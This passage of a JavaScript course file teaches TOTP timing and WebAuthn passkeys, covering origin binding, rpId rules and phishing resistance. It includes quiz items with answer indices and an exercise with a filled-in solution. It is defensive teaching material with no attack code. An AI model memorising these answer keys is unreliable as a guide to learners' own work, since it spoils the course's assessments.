        { q: 'With a 30 s period, how long does the same code stay on screen?', options: ['1 s', 'Until used', 'Until the 30 s window ends', '24 h'], answer: 2, why: 'T only changes every 30 seconds.' },
        { q: 'Which HMAC does RFC 6238 use by default?', options: ['HMAC-SHA-1 (SHA-256/512 also allowed)', 'MD5', 'Only SHA-256', 'AES'], answer: 0, why: 'Most authenticator apps use the SHA-1 default; our demo uses SHA-256 and says so.' },
        { q: 'Why can a real-time phishing proxy beat TOTP?', options: ['TOTP is weakly encrypted', 'The user types the code into the fake site, which relays it to the real site while it is still valid', 'Codes never expire', 'The proxy guesses the secret'], answer: 1, why: 'Nothing binds the code to the website asking for it.' },
        { q: 'After the password step but before the code step, the session should…', options: ['grant full access', 'be marked “MFA pending” and grant nothing else', 'be deleted', 'expose the TOTP secret'], answer: 1, why: 'Otherwise the second factor can be skipped by browsing directly to /dashboard.' },
      ],
      exercise: {
        task: `<p>Compute the TOTP time steps in the box below and decide whether the server accepts a late code, then click <b>Check</b>.</p>`,
        starter: TW(stepExHtml, stepExercise, { v: ['', '', '', ''] }),
        hint: 'Divide by 30 and drop the fraction. For the last question, compare the step difference with the ±1 window.',
        solution: TW(stepExHtml, stepExercise, { v: ['58907520', '58907520', '58907521', 'reject'] }),
      },
    },
    {
      id: 'webauthn-passkeys',
      section: S,
      title: 'WebAuthn & passkeys',
      explain: `
<p><strong>WebAuthn</strong> (a W3C standard, with the FIDO2 CTAP protocol for external keys) replaces shared secrets with <strong>public-key cryptography</strong>. A <strong>passkey</strong> is a WebAuthn credential that can sync between your devices (iCloud Keychain, Google Password Manager, 1Password…). In 2026 every major browser and OS supports them.</p>
<h3>The idea</h3>
<ul>
  <li>At registration your device creates a <strong>key pair just for this website</strong>. The <em>private</em> key stays on the device (or end-to-end encrypted in your password manager); the server stores only the <em>public</em> key.</li>
  <li>At login the server sends a random <strong>challenge</strong>; the device signs it with the private key after you unlock with a fingerprint, face or PIN; the server checks the signature with the public key.</li>
</ul>
<p>Analogy: a wax seal. Only you own the seal (private key); anyone with a picture of its imprint (public key) can check a letter is really from you, but can’t forge one.</p>
<h3>Why it beats phishing: origin binding</h3>
<ul>
  <li>Every credential belongs to an <strong>rpId</strong> (relying party id), e.g. <code>bank.test</code>. A page may only use its own domain or a parent domain as rpId, so <code>bank-login.evil.test</code> can’t ask for bank.test keys.</li>
  <li>The <em>browser</em> writes the real page origin into the signed <code>clientDataJSON</code>. The server checks it.</li>
  <li>There’s nothing the user could type into the wrong site.</li>
</ul>
<pre><code class="language-javascript">// browser side (simplified)
const cred = await navigator.credentials.get({
  publicKey: { challenge, rpId: 'bank.test', userVerification: 'preferred' },
});
// send cred.id, cred.response.clientDataJSON, authenticatorData, signature to the server</code></pre>
<div class="warn">The demos simulate the signature with <strong>HMAC-SHA-256</strong> because our helper library has no elliptic-curve code. Real passkeys sign with ECDSA P-256 (<code>alg: -7</code>, ES256) or RSA (<code>-257</code>), and the server verifies with the <em>public</em> key, which HMAC can’t model. Everything else (challenge, rpIdHash, clientDataJSON) is computed for real.</div>
<div class="tip">Server libraries (SimpleWebAuthn, webauthn4j, py_webauthn…) do the parsing and checks. Your job: generate challenges, store credentials, and configure rpId and allowed origins correctly.</div>
`,
      examples: [
        {
          title: 'Registration, authentication, phishing attempt',
          code: waSeq,
          explain: `
<details><summary>The problem: passwords and codes can be replayed by whoever receives them</summary>
<p>A password or OTP typed into a phishing page works just as well when the phisher replays it to the real site. WebAuthn has no reusable secret: each login is a fresh signature over a fresh challenge, and the signed data includes the origin the browser actually saw.</p>
</details>
<details><summary>Step by step: “② Authentication”</summary>
<table>
<tr><th>Step</th><th>Arrow</th><th>What is checked or created</th></tr>
<tr><td>1–2</td><td>login/options → challenge</td><td>server stores a one-time random challenge, sends rpId</td></tr>
<tr><td>3</td><td>navigator.credentials.get()</td><td>browser checks rpId vs page origin, builds clientDataJSON <code>{type:"webauthn.get", challenge, origin}</code></td></tr>
<tr><td>4</td><td>getAssertion(rpId, clientDataHash)</td><td>only the hash of clientDataJSON goes to the authenticator</td></tr>
<tr><td>5</td><td>find key, verify user, sign</td><td>authenticatorData = rpIdHash | flags | signCount; signature over authenticatorData ‖ clientDataHash (simulated)</td></tr>
<tr><td>6–7</td><td>assertion → POST /webauthn/login</td><td>credentialId, clientDataJSON, authenticatorData, signature, userHandle</td></tr>
<tr><td>8</td><td>verify with stored public key</td><td>signature, challenge, origin, rpIdHash, UP/UV, signCount</td></tr>
<tr><td>9</td><td>303 + Set-Cookie</td><td>a normal session from here on (lesson 2.2)</td></tr>
</table>
</details>
<details><summary>Key ideas: three independent locks against phishing</summary>
<ol>
  <li><b>Browser</b>: rpId must be the page’s domain or a parent of it → <code>SecurityError</code> (phishing tab, step 4).</li>
  <li><b>Authenticator</b>: keys are looked up by rpId → no bank.test key for evil rpIds (step 7).</li>
  <li><b>Server</b>: clientDataJSON.origin and rpIdHash must match what it expects → a relayed signature would be rejected.</li>
</ol>
</details>
<details><summary>Try this (in the origin-binding lab below)</summary>
<ul>
  <li><b>https://login.bank.test</b> + rpId <b>bank.test</b> → succeeds (parent domain is allowed).</li>
  <li><b>https://bank.test</b> + rpId <b>login.bank.test</b> → browser blocks (rpId can’t be more specific than the page).</li>
  <li><b>https://bank.test.evil.test</b> + rpId <b>bank.test</b> → blocked: the name merely <em>contains</em> bank.test.</li>
  <li><b>https://bank-login.evil.test</b> + rpId <b>evil.test</b> → browser allows it, but there is no passkey.</li>
  <li><b>http://bank.test</b> → no WebAuthn without a secure context.</li>
</ul>
</details>`,
        },
        { title: 'Origin-binding lab', code: rpLab },
      ],
      quiz: [
        { q: 'What does the server store after passkey registration?', options: ['The private key', 'The public key and credential id', 'The user’s fingerprint', 'A password hash'], answer: 1, why: 'A leak of public keys is harmless. Biometrics never leave the device.' },
        { q: 'Why can’t <code>bank-login.evil.test</code> use alice’s bank.test passkey?', options: ['Passkeys expire', 'The browser only allows an rpId equal to the page’s domain or a parent domain of it, and the signed clientDataJSON carries the real origin', 'The fingerprint is different', 'TLS blocks it'], answer: 1, why: 'Origin binding is enforced by the browser and verified again by the server.' },
        { q: 'What is the purpose of the server’s random challenge?', options: ['Encrypting the session', 'Making every signature unique, so old signatures can’t be replayed', 'Choosing the algorithm', 'Identifying the user'], answer: 1, why: 'The server accepts a signature only over the challenge it just issued.' },
        { q: 'When you unlock a passkey with your fingerprint, where is the fingerprint checked?', options: ['On the server', 'Locally on the device; only a “user verified” flag is sent', 'By the browser vendor', 'In the cookie'], answer: 1, why: 'The UV flag in authenticatorData reports that local verification happened.' },
      ],
      exercise: {
        task: `<p>For each passkey sign-in attempt in the box below, choose the outcome and click <b>Check</b>.</p>`,
        starter: W(waExHtml, waExercise, { fill: false }),
        hint: 'Check in order: browser (rpId vs page domain) → authenticator (is there a key for that rpId?) → server (is the origin expected?).',
        solution: W(waExHtml, waExercise, { fill: true }),
      },
    },
  );
})();
